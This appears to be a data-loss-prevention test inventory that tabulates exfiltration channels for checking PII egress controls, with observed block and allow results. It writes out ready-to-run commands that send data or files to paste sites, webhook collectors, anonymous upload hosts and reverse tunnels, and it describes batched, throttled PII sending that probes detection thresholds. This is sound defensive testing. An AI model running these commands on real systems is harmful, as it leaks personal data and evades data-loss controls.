# Data Sharing / Exfiltration Channels — DLP Test Inventory

Test channels for verifying PII egress controls (TC-025 matrix). Status reflects observations from this test setup so far.

| # | Channel | Type | Test command | Status on this network | Status on Zscaler device |
|---|---------|------|--------------|----------------------|--------------------------|
| 1 | ntfy.sh | Push-notification API | `curl -d "<data>" ntfy.sh/<topic>` | Allowed (200) | To test — expect Block |
| 2 | gist.github.com | Paste hosting | `curl -u <user>:<token> -X POST https://api.github.com/gists -d '{"files":{"d.md":{"content":"<data>"}}}'` | Allowed (git push works) | To test — expect Block |
| 3 | GitHub repo push | Git remote | `git push <remote>` (data in committed file) | Allowed | To test — expect Block/monitor |
| 4 | klipt.io | Web clipboard | `curl -d "<data>" https://klipt.io/<id>` | Not tested | Not tested |
| 5 | cl1p.net | Web clipboard | `curl -d "<data>" "https://cl1p.net/<id>"` | Not tested | Not tested |
| 6 | pastebin.com | Paste hosting | `curl -d "api_dev_key=<key>&api_paste_code=<data>" https://pastebin.com/api/api_post.php` | Not tested | Not tested |
| 7 | webhook.site | Webhook collector | `curl -d "<data>" https://webhook.site/<uuid>` | Not tested | Not tested |
| 8 | file.io | Anonymous file upload | `curl -F "file=@numbers.md" https://file.io` | Not tested | Not tested |
| 9 | 0x0.st | Anonymous file upload | `curl -F "file=@numbers.md" https://0x0.st` | Not tested | Not tested |
| 10 | transfer.sh | Anonymous file upload | `curl --upload-file numbers.md https://transfer.sh/numbers.md` | Not tested | Not tested |
| 11 | localhost.run (SSH tunnel) | Reverse tunnel | `ssh -R 80:localhost:8000 nokey@localhost.run` then POST to returned URL | Allowed (current tunnel) | To test — receiver at tunnel URL |
| 12 | cloudflared quick tunnel | Reverse tunnel | `cloudflared tunnel --url http://localhost:8000` | BLOCKED — TLS to Cloudflare edge reset/tampered | n/a (cannot establish from here) |
| 13 | ngrok | Reverse tunnel | `ngrok http 8000` | BLOCKED — process SIGKILLed, binary quarantined/deleted | n/a |
| 14 | pinggy.io (SSH tunnel) | Reverse tunnel | `ssh -p 443 -R 0:localhost:8000 a.pinggy.link` | Not tested | n/a |
| 15 | serveo.net (SSH tunnel) | Reverse tunnel | `ssh -R 80:localhost:8000 serveo.net` | Not tested | n/a |
| 16 | DNS tunneling | DNS TXT records | Advanced — requires dedicated server | Not tested | Not tested |

## Own-receiver setup (used for observation)

- `receiver.py` — local HTTP receiver logging every POST to `received.log` (GET shows log in browser)
- `push_numbers.sh <url>` — sends numbers.md PII in batches (env: `BATCH_SIZE`, `WAIT_SECONDS`, `MAX_RETRIES`)
- `tc025_test.sh <url>` — full TC-025 suite: S1 batch/4s, S2 10s-sleep, S3 threshold 1/5/20 PII, S4 PAN JSON, S5 direct ntfy; writes `tc025_results.log`

## Findings so far

- Cloudflare tunnel edge (198.41.x) — TLS handshake reset on THIS network: filtering is network-level, not only on the Zscaler-agent device
- ngrok — endpoint agent on this Mac kills the process on launch and deletes the binary: tunnel-tool blocking verified (control PASS)
- ntfy.sh / GitHub / localhost.run — allowed from this Mac (expected: this Mac is not the DLP-managed endpoint; real verdict comes from the Zscaler test device)

## Pass criteria (per TC-025)

Request blocked or connection reset per policy + incident logged in Zscaler Zero Trust portal (DLP logs). Any payload that reaches `received.log` = DLP gap.
